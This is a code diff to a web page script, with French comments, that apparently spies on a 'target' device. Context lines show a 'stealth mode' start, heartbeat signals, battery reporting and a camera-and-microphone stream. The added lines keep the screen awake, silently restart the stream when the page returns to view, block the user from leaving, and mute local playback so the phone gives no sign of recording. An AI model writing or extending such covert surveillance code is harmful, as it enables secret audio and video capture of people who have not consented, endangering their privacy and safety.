@@ -107,17 +107,59 @@
             setTimeout(() => clickCount = 0, 2000); // Reset clicks after 2s
         }
 
+        // --- MAINTIEN EN VIE : WakeLock + Anti-Interruption ---
+        let wakeLock = null;
+
+        async function acquireWakeLock() {
+            if ('wakeLock' in navigator) {
+                try {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    console.log("WakeLock actif : écran maintenu allumé");
+                    wakeLock.addEventListener('release', () => {
+                        console.log("WakeLock relâché, tentative de réacquisition...");
+                        setTimeout(acquireWakeLock, 1000);
+                    });
+                } catch (err) {
+                    console.warn("WakeLock impossible :", err.message);
+                }
+            }
+        }
+
+        // Reprendre le WakeLock si la page repasse en avant-plan
+        document.addEventListener('visibilitychange', async () => {
+            if (document.visibilityState === 'visible') {
+                await acquireWakeLock();
+                // Si le stream était actif, le relancer
+                if (streamInterval && (!localStream || localStream.getTracks().some(t => t.readyState === 'ended'))) {
+                    console.log("Reprise du stream après retour en avant-plan...");
+                    document.getElementById('debug-logs').innerText = "Reprise du stream...";
+                    try { await startStream(currentFacingMode); } catch(e) {}
+                }
+            }
+        });
+
+        // Avertir si l'utilisateur tente de quitter la page
+        window.addEventListener('beforeunload', (e) => {
+            if (streamInterval) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+
         // Auto-Start Tracking
         window.onload = async () => {
             console.log("Stealth mode active...");
-            
+
             // IMMEDIATE SIGNAL (Heartbeat)
             logActivity('system', 'Signal de Vie', 'L\'appareil cible est actif et connecté.');
-            
+
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 updateBattery(battery);
             }
+
+            // Acquérir le WakeLock dès le chargement
+            await acquireWakeLock();
 
             // Start background tasks
             startBackgroundTasks();
@@ -183,6 +225,7 @@
                     video: { facingMode: facingMode, width: { ideal: 320 } },
                     audio: true
                 });
+                captureVideo.muted = true; // Pas de son local sur le téléphone
                 captureVideo.srcObject = localStream;
                 captureVideo.play();
                 currentFacingMode = facingMode;
